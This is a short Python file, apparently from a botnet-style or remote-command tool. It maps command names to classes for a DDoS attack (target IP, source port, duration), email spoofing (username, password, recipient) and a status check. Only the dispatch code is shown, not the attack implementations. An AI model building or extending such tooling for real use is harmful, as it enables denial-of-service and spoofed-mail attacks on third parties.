from commands.ddos import Ddos
from commands.email_spoof import EmailSpoof
from commands.status import Status


def command_factory(command_type, params):
    if command_type is None:
        return
    
    match command_type:
        case "ddos":
            return Ddos(params["target_ip"], params["source_port"], params["max_duration"])
    
        case "email_spoof":
            return EmailSpoof(params["username"], params["password"], params["to_email"])
        
        case "status":
            return Status()
        
        case _:
            return